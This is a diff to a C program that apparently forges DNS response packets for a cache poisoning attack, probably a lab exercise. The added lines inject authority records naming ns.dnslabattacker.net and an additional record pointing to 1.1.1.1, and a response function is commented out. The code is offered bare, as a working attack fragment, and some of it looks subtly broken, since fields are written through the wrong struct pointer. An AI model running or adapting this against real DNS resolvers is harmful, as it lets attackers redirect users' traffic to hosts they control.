@@ -227,8 +227,22 @@ int main(int argc, char *argv[])
     end_res_ns->datalen=htons(23);
     length_res+=10;
     
+    strcpy(data_res+length_res, "\2ns\14dnslabattacker\3net");
+    length_res+=23;
 
+    strcpy(data_res+length_res, "\2ns\14dnslabattacker\3net");
+    length_res+=23;
     
+    struct sesEnd * end_res_add = (struct sesEnd *)(data_res+length_res);
+    end_res_ns->type=htons(1);
+    end_res_ns->class=htons(1);
+    end_res_ns->ttl_l=htons(1);
+    end_res_ns->ttl_u=htons(1);
+    end_res_ns->datalen=htons(4);
+    length_res+=10; 
+    strcpy(data_res+length_res, "\1\1\1\1");
+    length_res+=5;
+        
     
 
     /////////////////////////////////////////////////////////////////////
@@ -345,6 +359,7 @@ int main(int argc, char *argv[])
     return 0;
 }
 
+/*
 void responsePacket(int sd, char *dest_addr){
     char buffer[PCKT_LEN];
     memset(buffer, 0 ,PCKT_LEN);
@@ -503,6 +518,4 @@ void responsePacket(int sd, char *dest_addr){
 
     
 }
-
-// What
-// Hm....
+*/
